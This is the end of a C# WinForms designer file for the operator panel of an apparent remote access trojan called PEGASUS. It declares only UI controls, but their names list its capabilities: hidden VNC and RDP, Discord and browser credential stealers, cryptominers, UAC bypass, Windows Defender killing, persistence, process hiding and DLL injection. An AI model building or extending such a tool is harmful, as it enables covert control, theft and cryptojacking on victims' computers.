            this.guna2Panel3.ResumeLayout(false);
            this.guna2Panel3.PerformLayout();
            this.LISTVIEWSPANELSMALL2.ResumeLayout(false);
            this.LISTVIEWSPANELSMALL2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox5)).EndInit();
            this.LISTVIEWPANEL0.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter2)).EndInit();
            this.ResumeLayout(false);

        }



        #endregion
        private System.Windows.Forms.ContextMenuStrip contextMenuThumbnail;
        private System.Windows.Forms.ToolStripMenuItem sTARTToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem sTOPToolStripMenuItem;
        public System.Windows.Forms.NotifyIcon notifyIcon1;
        private System.Windows.Forms.ContextMenuStrip contextMenuLogs;
        private System.Windows.Forms.ToolStripMenuItem cLEARToolStripMenuItem;
        private System.Windows.Forms.TabControl tabControl1;
        public System.Windows.Forms.ListView listView4;
        private System.Windows.Forms.ColumnHeader columnHeader4;
        private System.Windows.Forms.ColumnHeader columnHeader5;
        public System.Windows.Forms.ListView listView2;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem14;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem15;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem16;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem17;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem18;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem19;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem20;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem21;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem22;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem23;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem24;
        private System.Windows.Forms.Panel panel3;
        private System.Windows.Forms.Panel panel2;
        private System.Windows.Forms.Panel LISTVIEWTASKS;
        private Guna.UI2.WinForms.Guna2Transition guna2Transition1;
        private Guna.UI2.WinForms.Guna2Transition guna2Transition2;
        private Guna.UI2.WinForms.Guna2ContextMenuStrip guna2ContextMenuStrip2;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem61;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem62;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem63;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem64;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem65;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem66;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem67;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem68;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem69;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem70;
        private Guna.UI2.WinForms.Guna2NotificationPaint guna2NotificationPaint1;
        private Guna.UI2.WinForms.Guna2Transition loadForm;
        private Guna.UI2.WinForms.Guna2Transition guna2Transition3;
        private Guna.UI2.WinForms.Guna2HtmlToolTip guna2HtmlToolTip1;
        private Guna.UI2.WinForms.Guna2ContextMenuStrip guna2ContextMenuStrip1;
        private System.Windows.Forms.ToolStripMenuItem tasksControlToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem onToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem offToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem2;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem3;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem4;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem5;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem6;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem7;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem8;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem9;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem10;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem11;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem12;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem13;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem71;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem72;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem73;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem74;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem78;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem33;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem40;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem41;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem42;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem43;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem34;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem35;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem36;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem37;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem38;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem39;
        private System.Windows.Forms.ToolStripMenuItem hVNChBrowsersToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem49;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem50;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem51;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem52;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem53;
        private System.Windows.Forms.ToolStripMenuItem passwordRecoveryToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem31;
        private System.Windows.Forms.ToolStripMenuItem sKYNETToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem recoverAllSendToDiscordToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem56;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem57;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem60;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem59;
        private System.Windows.Forms.ToolStripMenuItem pEGASUSBUILDERToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem sKYNETSHOPToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem58;
        private System.Windows.Forms.ToolStripMenuItem openSupportTicketToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem addPEGASUSSheduleTaskToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem addPEGASUSToStartupToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem spamToolsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem sendEmailFromClientPCToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem webHookSpammerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem chatSpammerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem2;
        private System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem5;
        private System.Windows.Forms.ToolStripMenuItem executeVBSToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem mergeRegToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem executebatToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem silentInstallerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem cmdToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem powershellToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem75;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem81;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem76;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem77;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem79;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem80;
        private System.Windows.Forms.ToolStripMenuItem hiddenRDPToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem HRDPconnectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem HRDPcleanUnistallToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem copyProfileToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem discordStealerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteReverseProxyToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem peToShellConverterToolStripMenuItem;
        private Guna.UI2.WinForms.Guna2ShadowPanel LISTVIEWPANEL0;
        private Guna.UI2.WinForms.Guna2Panel LISTVIEWSPANEL1;
        public System.Windows.Forms.ListView listView1;
        private Guna.UI2.WinForms.Guna2Panel LISTVIEWSPANELSMALL2;
        private Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox5;
        private System.Windows.Forms.Label label6;
        private Guna.UI2.WinForms.Guna2Separator guna2Separator1;
        private System.Windows.Forms.Label label1;
        private Guna.UI2.WinForms.Guna2Panel guna2Panel1;
        private Guna.UI2.WinForms.Guna2VSeparator guna2VSeparator2;
        private Guna.UI2.WinForms.Guna2VSeparator guna2VSeparator1;
        private System.Windows.Forms.StatusStrip miniToolStrip;
        private System.Windows.Forms.Label label7;
        public System.Windows.Forms.ColumnHeader lv_ip;
        public System.Windows.Forms.ColumnHeader lv_country;
        public System.Windows.Forms.ColumnHeader lv_group;
        public System.Windows.Forms.ColumnHeader lv_cpugpu;
        public System.Windows.Forms.ColumnHeader lv_hwid;
        public System.Windows.Forms.ColumnHeader lv_user;
        public System.Windows.Forms.ColumnHeader lv_camera;
        public System.Windows.Forms.ColumnHeader lv_os;
        public System.Windows.Forms.ColumnHeader lv_version;
        public System.Windows.Forms.ColumnHeader lv_ins;
        public System.Windows.Forms.ColumnHeader lv_admin;
        public System.Windows.Forms.ColumnHeader lv_av;
        public System.Windows.Forms.ColumnHeader lv_ping;
        public System.Windows.Forms.ColumnHeader lv_act;
        private Guna.UI2.WinForms.Guna2Separator guna2Separator3;
        private Guna.UI2.WinForms.Guna2ToggleSwitch guna2ToggleSwitch1;
        private System.Windows.Forms.ColumnHeader lv_gpuram;
        private System.Windows.Forms.ToolStripMenuItem priviligeEscalationFirewallToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem uACExplotationToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem defeatFirewallToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem windowsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem windowsToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem windows7ToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem adminLoopToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disableUACToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem killWindowsDefenderToolStripMenuItem;
        private System.Windows.Forms.Timer ping;
        private System.Windows.Forms.Timer UpdateUI;
        public System.Windows.Forms.ImageList ThumbnailImageList;
        private System.Windows.Forms.Timer ConnectTimeout;
        private System.Windows.Forms.Timer TimerTask;
        private Guna.UI2.WinForms.Guna2VScrollBar guna2VScrollBar2;
        private Guna.UI2.WinForms.Guna2VScrollBar guna2VScrollBar1;
        private System.Windows.Forms.ColumnHeader columnHeader3;
        private System.Windows.Forms.ToolStripMenuItem cPUMinerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem deleteToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem gPUMinerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem5;
        private System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem6;
        private System.Windows.Forms.ToolStripMenuItem deleteToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem protectionToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem25;
        private System.Windows.Forms.ToolStripMenuItem sTARTEASYToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem26;
        private System.Windows.Forms.ToolStripMenuItem remoteMinerToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem MinerstartToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem MinerstopToolStripMenuItem1;
        private Guna.UI2.WinForms.Guna2VScrollBar guna2VScrollBar3;
        private Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox1;
        private Guna.UI2.WinForms.Guna2ContextMenuStrip guna2ContextMenuStrip3;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem48;
        private System.Windows.Forms.ToolStripMenuItem reverseProxyToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem ngrokToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem reverseProxyToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem copySelectedToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem connectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem addUserPEGASUSPEGASUSToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem dLLInjectionToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem injectionPanelToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem stopNgrokToolStripMenuItem;
        private Guna.UI2.WinForms.Guna2TabControl guna2TabControl1;
        private System.Windows.Forms.TabPage tabPage1;
        private System.Windows.Forms.TabPage tabPage2;
        private System.Windows.Forms.TabPage tabPage3;
        private Guna.UI2.WinForms.Guna2Panel guna2Panel2;
        private System.Windows.Forms.Label label8;
        public Guna.UI2.WinForms.Guna2ToggleSwitch chkSounds;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label Listener;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.StatusStrip statusStrip1;
        private System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel1;
        public System.Windows.Forms.ListView listView3;
        private Guna.UI2.WinForms.Guna2ContextMenuStrip guna2ContextMenuStrip4;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem27;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem28;
        private Guna.UI2.WinForms.Guna2Separator guna2Separator4;
        private Guna.UI2.WinForms.Guna2VSeparator guna2VSeparator3;
        private Guna.UI2.WinForms.Guna2Separator guna2Separator5;
        private Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;
        private Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox3;
        private Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox2;
        private Guna.UI2.WinForms.Guna2Separator guna2Separator6;
        private Guna.UI2.WinForms.Guna2VScrollBar guna2VScrollBar4;
        private System.Windows.Forms.ToolStripMenuItem taskMgrDogToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem4;
        private System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem4;
        private System.Windows.Forms.ToolStripMenuItem watchDogToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem3;
        private System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem2;
        private System.Windows.Forms.ToolStripMenuItem hIDEPEGASUSPROCESSToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem82;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem83;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem54;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem55;
        public System.Windows.Forms.Label label11;
        private System.Windows.Forms.Label label10;
        public System.Windows.Forms.Label label5;
        private Guna.UI2.WinForms.Guna2VSeparator guna2VSeparator4;
        private Guna.UI2.WinForms.Guna2VSeparator guna2VSeparator5;
        private Guna.UI2.WinForms.Guna2Separator guna2Separator2;
        private System.Windows.Forms.TabPage tabPage4;
        private System.Windows.Forms.ListView HVNCList;
        private System.Windows.Forms.ColumnHeader columnHeader6;
        private System.Windows.Forms.ColumnHeader columnHeader7;
        private System.Windows.Forms.ColumnHeader columnHeader8;
        private System.Windows.Forms.ColumnHeader columnHeader9;
        private System.Windows.Forms.ColumnHeader columnHeader10;
        private System.Windows.Forms.ColumnHeader columnHeader11;
        private System.Windows.Forms.ColumnHeader columnHeader12;
        private Guna.UI2.WinForms.Guna2Panel guna2Panel3;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Label label12;
        private Guna.UI2.WinForms.Guna2TextBox HVNCListenPort;
        private System.Windows.Forms.Label label13;
        private Guna.UI2.WinForms.Guna2GradientButton btnStopHvnc;
        private Guna.UI2.WinForms.Guna2GradientButton btnStarthvnc;
        private System.Windows.Forms.Label label14;
        public System.Windows.Forms.ImageList imageList1;
        private System.Diagnostics.PerformanceCounter performanceCounter1;
        private System.Diagnostics.PerformanceCounter performanceCounter2;
        private Guna.UI2.WinForms.Guna2Panel guna2Panel4;
        private Guna.UI2.WinForms.Guna2GradientButton btnRemoveHvnc;
        private Guna.UI2.WinForms.Guna2GradientButton btnAbouthvnc;
        private Guna.UI2.WinForms.Guna2GradientButton btnUploadExec;
        private Guna.UI2.WinForms.Guna2GradientButton btnKillChrome;
        private Guna.UI2.WinForms.Guna2GradientButton btnresetScale;
        private Guna.UI2.WinForms.Guna2GradientButton btnRecover;
        private Guna.UI2.WinForms.Guna2Separator guna2Separator7;
        private Guna.UI2.WinForms.Guna2GradientButton btnVisitUrl;
        private System.Windows.Forms.ImageList imageList2;
        private Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton4;
        private Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton3;
        private Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton2;
        private Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton1;
        private Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton5;
        private System.Windows.Forms.ToolStripMenuItem connectToolStripMenuItem1;
        private Guna.UI2.WinForms.Guna2GradientButton btnBinder;
        private System.Windows.Forms.ToolStripMenuItem kATANAToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem chromeExtentionStealerToolStripMenuItem;
        private System.Windows.Forms.Label label15;
    }
}

